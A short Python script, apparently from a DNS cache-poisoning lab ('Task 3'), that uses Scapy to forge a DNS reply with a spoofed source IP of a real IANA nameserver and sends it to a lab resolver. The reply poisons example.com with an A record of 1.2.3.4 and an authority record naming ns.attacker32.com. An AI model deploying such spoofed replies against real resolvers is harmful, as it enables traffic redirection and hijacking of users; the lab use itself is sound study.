#!/usr/bin/python3
from scapy.all import *

# Task 3: Spoof DNS reply

name = 'www.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'


## Query Section:
Qdsec = DNSQR(qname=name)

## Answer Section:
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)

## Authority Section:
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)

dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)

## Qui devo scegliere uno dei due nameserver autoritativi per il dominio example.com
## a.iana-servers.net.		199.43.135.53
## b.iana-servers.net.		199.43.133.53

ip = IP(dst='10.9.0.53', src='199.43.135.53')

udp = UDP(dport=33333, sport=53, chksum=0)

reply = ip/udp/dns

reply.show()

send(reply)

